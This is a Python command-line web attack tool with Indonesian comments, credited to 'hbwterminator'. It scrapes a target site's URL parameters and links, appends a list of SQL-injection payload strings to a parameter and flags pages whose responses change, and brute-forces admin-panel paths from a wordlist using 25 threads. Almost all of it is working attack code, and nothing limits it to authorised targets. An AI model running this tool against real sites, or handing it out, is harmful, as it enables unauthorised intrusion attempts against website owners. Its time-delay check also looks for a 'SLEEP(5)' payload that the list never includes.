import gevent
from gevent.pool import Pool
from concurrent.futures import ThreadPoolExecutor
import threading
import requests
from bs4 import BeautifulSoup
import urllib.parse
import time
from rich.console import Console
from rich.table import Table
from colorama import Fore, Style, init
init(autoreset=True)
console = Console()

ascii_art = """
       ▄▄▄▄▄▄▄▄▄▄▄▄▄
    ▄██             ██▄
  ██   ▄▄          ▄▄  ██
 ██   ▄▄▄▄         ▄▄▄▄  ██
 ██   ▀▀▀▀         ▀▀▀▀  ██
  ██   ▀▀▀  HBW    ▀▀▀ ██
    ▀██             ██▀
      ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
          ▄▄▄▄▄▄▄
         ▀ ▀ ▀ ▀ ▀
        ▀▀▀▀▀▀▀▀▀▀▀
"""
console.print(f"[bold green]{ascii_art}[/bold green]")
console.print("[bold yellow]⚡ Author  : [/bold yellow][green]hbwterminator[/green]")
console.print("[bold yellow]🔗 GitHub  : [/bold yellow][green]https://github.com/TERARIAgM[/green]\n")
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

URL_BALANCER_PAYLOADS = [
    "--+-", "--+-", "--+ '--+ ", "')--+- '", "))--+- )", "-- ))-- )--+ ",
    "-- -/*", "/*", "%23", "%23%23", "%60", "%00", ";%00", "%90", "'--+-", "'"
]

def print_log(message, color="green"):
    console.print(f"[bold {color}]➤ {message}[/bold {color}]")
def find_url_parameters(url):
    """Mencari parameter di URL dan menyimpannya ke file"""
    print_log("Mengecek URL untuk parameter...", "yellow")
    try:
        response = requests.get(url, headers=HEADERS, timeout=3)
        if response.status_code == 200:
            print_log(f"URL berhasil diakses: {url}", "cyan")
            soup = BeautifulSoup(response.text, 'html.parser')
            links = soup.find_all('a', href=True)
            found_params = set()
            
            for link in links:
                href = link['href']
                parsed_url = urllib.parse.urlparse(href)
                query_params = urllib.parse.parse_qs(parsed_url.query)
                if query_params:
                    for key, values in query_params.items():
                        for value in values:
                            full_url = urllib.parse.urljoin(url, href)
                            found_params.add((key, full_url))

            if found_params:
                table = Table(title="Hasil Scan Parameter URL", show_header=True, header_style="bold cyan")
                table.add_column("Parameter", style="bold yellow")
                table.add_column("URL", style="bold green")

                with open("parameters_found.txt", "w") as file:
                    file.write("Hasil Scan Parameter URL:\n")
                    file.write("=" * 50 + "\n")

                    for param, full_url in sorted(found_params):
                        table.add_row(param, full_url)
                        file.write(f"Parameter: {param}\nURL: {full_url}\n\n")

                console.print(table)
                print_log(f"Total parameter ditemukan: {len(found_params)}", "cyan")
                print_log("Hasil scan disimpan di 'parameters_found.txt'", "green")
            else:
                print_log("Tidak ada parameter ditemukan.", "red")
        else:
            print_log(f"Gagal mengakses URL: {url}. Status Code: {response.status_code}", "red")
    except requests.RequestException as e:
        print_log(f"Error: {e}", "red")

def grep_links_and_resources(url):
    """Mencari semua link dan resource di halaman"""
    print_log("Mengekstrak semua link dan resource...", "yellow")
    try:
        response = requests.get(url, headers=HEADERS, timeout=3) 
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            base_url = urllib.parse.urlparse(url)
            base = f"{base_url.scheme}://{base_url.netloc}"
            table = Table(title="Hasil Scan Link & Resource", show_header=True, header_style="bold cyan")
            table.add_column("Jenis", style="bold yellow")
            table.add_column("URL", style="bold green")
            results = 0
            for tag in soup.find_all(['a', 'link', 'script', 'img']):
                link = None
                if tag.name == 'a' and tag.get('href'):
                    link = tag['href']
                    jenis = "🔗 Link"
                elif tag.name == 'link' and tag.get('href'):
                    link = tag['href']
                    jenis = "🎨 CSS"
                elif tag.name == 'script' and tag.get('src'):
                    link = tag['src']
                    jenis = "📜 JavaScript"
                elif tag.name == 'img' and tag.get('src'):
                    link = tag['src']
                    jenis = "🖼️ Gambar"
                if link:
                    if not link.startswith(("http://", "https://")):
                        link = urllib.parse.urljoin(base, link)
                    table.add_row(jenis, link)
                    results += 1
            console.print(table)
            print_log(f"Total link dan resource ditemukan: {results}", "cyan")
        else:
            print_log(f"Gagal mengakses URL: {url}. Status Code: {response.status_code}", "red")
    except requests.RequestException as e:
        print_log(f"Error: {e}", "red")

def scan_sql_injection(target_url):
    """Otomatis deteksi parameter dan uji SQL Injection"""
    console.print(f"\n[bold yellow]➤ Menguji SQL Injection pada {target_url}...[/bold yellow]\n")

    parsed_url = urllib.parse.urlparse(target_url)
    query_params = urllib.parse.parse_qs(parsed_url.query)

    if not query_params:
        console.print("[bold red]❌ Tidak ditemukan parameter dalam URL![/bold red]")
        return

    param = list(query_params.keys())[0]

    table = Table(title="Hasil Pengujian SQL Injection", show_header=True, header_style="bold cyan")
    table.add_column("Teknik", style="bold yellow")
    table.add_column("URL yang Diuji", style="bold green")
    table.add_column("Status", style="bold red")

    normal_response = requests.get(target_url, headers=HEADERS)
    normal_length = len(normal_response.text)

    combined_payloads = {f"URL Balancer {i+1}": p for i, p in enumerate(URL_BALANCER_PAYLOADS)}
    for name, payload in combined_payloads.items():
        test_url = target_url.replace(f"{param}={query_params[param][0]}", f"{param}={query_params[param][0]}{payload}")
        try:
            start_time = time.time()
            response = requests.get(test_url, headers=HEADERS)
            end_time = time.time()

            if "SLEEP(5)" in payload and (end_time - start_time) > 4:
                status = "[bold green]Rentan (Time Delay Terdeteksi)[/bold green]"
            elif abs(len(response.text) - normal_length) > 50:
                status = "[bold green]Rentan (Response Berubah)[/bold green]"
            else:
                status = "[bold red]Tidak Rentan[/bold red]"

        except requests.RequestException:
            status = "[bold red]Error[/bold red]"

        table.add_row(name, test_url, status)

    console.print(table)
def scan_url(target, path, found_urls):
    """Fungsi untuk scan satu URL dengan threading"""
    url = f"{target}/{path}"
    try:
        response = requests.get(url, headers=HEADERS, allow_redirects=False, timeout=5)
        if response.status_code == 200:
            console.print(f"[bold green]✓ Ditemukan: {url} (200 OK)[/bold green]")
            found_urls.append(url)
        elif response.status_code == 403:
            console.print(f"[bold yellow]! Terlarang: {url} (403 Forbidden)[/bold yellow]")
    except requests.exceptions.RequestException as e:
        console.print(f"[bold red]❌ Error: {e}[/bold red]")

def search_admin_panel(target, wordlist_file):
    try:
        with open(wordlist_file, "r") as f:
            wordlist = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        console.print(f"[bold red]❌ File {wordlist_file} tidak ditemukan![/bold red]")
        return

    console.print("\n[bold yellow]🔍 Mencari halaman admin...[/bold yellow]\n")
    found_urls = []

    def scan_admin(path):
        url = f"{target}/{path}"
        try:
            response = requests.get(url, headers=HEADERS, timeout=2, allow_redirects=False)
            if response.status_code == 200:
                console.print(f"[bold green]✓ Ditemukan: {url} (200 OK)[/bold green]")
                found_urls.append(url)
            elif response.status_code == 403:
                console.print(f"[bold yellow]! Terlarang: {url} (403 Forbidden)[/bold yellow]")
        except requests.RequestException:
            pass  # Jangan print error agar lebih cepat

    with ThreadPoolExecutor(max_workers=25) as executor:
        executor.map(scan_admin, wordlist)

    console.print("\n[bold cyan]✅ Scan Selesai![/bold cyan]")
    if found_urls:
        console.print("\n[bold green]🎯 Halaman admin ditemukan:[/bold green]")
        for link in found_urls:
            console.print(f"   - {link}")
    else:
        console.print("\n[bold red]❌ Tidak ada halaman admin ditemukan![/bold red]")

def main():
    print(Fore.CYAN + Style.BRIGHT + "Pilih mode scan:")
    print(Fore.CYAN + "1. Scan Parameter URL")
    print(Fore.CYAN + "2. Scan Link & Resource")
    print(Fore.CYAN + "3. Scan SQL Injection")
    print(Fore.CYAN + "4. Scan Halaman Admin")
    choice = input(Fore.CYAN + "\nPilih (1/2/3/4): ")

    if choice == "3":  # Kalau pilih Scan SQL Injection
        print(Fore.YELLOW + "Contoh URL: https://example.id/gallery.php?id=1")
        url = input(Fore.CYAN + "Masukkan URL target: ")
    else:
        url = input(Fore.CYAN + "\nMasukkan URL target: ")

    if choice == "1":
        find_url_parameters(url)
    elif choice == "2":
        grep_links_and_resources(url)
    elif choice == "3":
        scan_sql_injection(url)
    elif choice == "4":
        search_admin_panel(url, "wordlist.txt")
    else:
        print(Fore.RED + "❌ Pilihan tidak valid!")
if __name__ == "__main__":
    main()

